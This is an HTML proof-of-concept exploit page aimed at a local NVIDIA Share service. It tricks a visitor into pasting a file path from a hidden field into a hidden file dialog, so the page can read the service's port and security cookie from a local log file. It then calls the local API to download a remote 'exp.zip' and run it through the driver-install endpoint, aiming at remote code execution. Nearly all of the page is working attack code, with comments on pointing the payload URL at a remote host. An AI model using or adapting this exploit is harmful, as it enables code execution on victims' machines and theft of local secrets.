<html>

<head>
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
    <script>
        function sleep(delay) {
            for (var t = Date.now(); Date.now() - t <= delay;);
        }

        //this link is the evil file link.(Url encoded)
        //change it to remote url
        //This POC is designed for remote, for more complicated network environment.
        //if it's local or LAN test, add something big to exp.zip(about 200 MB, just in case fail)
        url = "http%3a%2f%2f127.0.0.1%3a8080%2fexp.zip";

        function submitRequest(port, secret) {
            xhrUpload = new XMLHttpRequest();
            xhrUpload.open("POST", "http:\/\/127.0.0.1:" + port + "\/download\/v.0.1\/start\/233\/" + url + "\/1", true);
            xhrUpload.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
            xhrUpload.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
            xhrUpload.setRequestHeader("Content-Type", "text\/html");
            xhrUpload.setRequestHeader("X_LOCAL_SECURITY_COOKIE", secret);
            xhrUpload.onreadystatechange = function() {
                if (xhrUpload.readyState === 4) {
                    if (xhrUpload.status == 200) {
                        console.log(xhrUpload.responseText);
                        while (true) {
                            xhrStatus = new XMLHttpRequest();
                            xhrStatus.open("GET", "http:\/\/127.0.0.1:" + port + "\/download\/v.0.1\/status\/233\/" + url, false);
                            xhrStatus.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
                            xhrStatus.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
                            xhrStatus.setRequestHeader("Content-Type", "text\/html");
                            xhrStatus.setRequestHeader("X_LOCAL_SECURITY_COOKIE", secret);
                            xhrStatus.send(null);
                            console.log(xhrStatus.responseText);
                            if (JSON.parse(xhrStatus.responseText)["percentComplete"] > 50) {
                                while (true) {
                                    var downloadLocation = JSON.parse(xhrUpload.responseText)["downloadedLocation"];
                                    var xhrExecute = new XMLHttpRequest();
                                    xhrExecute.open("POST", "http:\/\/127.0.0.1:" + port + "\/DriverInstall\/v.0.1\/Start", false);
                                    xhrExecute.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
                                    xhrExecute.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
                                    xhrExecute.setRequestHeader("Content-Type", "text\/html");
                                    xhrExecute.setRequestHeader("X_LOCAL_SECURITY_COOKIE", secret);
                                    xhrExecute.send(JSON.stringify({
                                        'pfwLocation': downloadLocation,
                                        'isPfw': true,
                                        'driverLocation': downloadLocation,
                                        'isCustom': false
                                    }));
                                    if (xhrExecute.status == 201) {
                                        console.log(xhrExecute.responseText);
                                        console.log("trying RCE");
                                    } else {
                                        break;
                                    }
                                    sleep(10);
                                }
                                break;
                            }
                        }
                    }
                }
            }
            xhrUpload.send(null);
        }


        $(document).on('change', '.file-upload-button', function(event) {
            var reader = new FileReader();

            reader.onload = function(event) {
                var log = event.target.result;
                var pat1 = new RegExp('port": (.*?),');
                var pat2 = new RegExp('secret": "(.*?)"');
                var port = pat1.exec(log)[1];
                var secret = pat2.exec(log)[1];
                console.log(port);
                console.log(secret);
                submitRequest(port, secret);
            }

            reader.readAsText(event.target.files[0]);
        });

        //Copy text from some text field
        function myFunction() {
            var copyText = document.getElementById("myInput");
            copyText.select();
            document.execCommand("copy");

        }

        //trigger the copy and file window on ctrl press
        $(document).keydown(function(keyPressed) {
            if (keyPressed.keyCode == 17) {
                myFunction();
                document.getElementById('file-input').click();
            }
        });
    </script>
    <h2>
        Press CTRL+V+Enter
    </h2>
    <!--Hidden text box to copy text from-->

    <input type="text" value="%LOCALAPPDATA%\NVIDIA Corporation\NVIDIA Share\console.log" id="myInput" style="opacity: 0;" readonly>
    <!--file input-->
    <input id="file-input" onclick="this.value=null;" class='file-upload-button' type="file" name="name" style="display: none;" />
</body>

</html>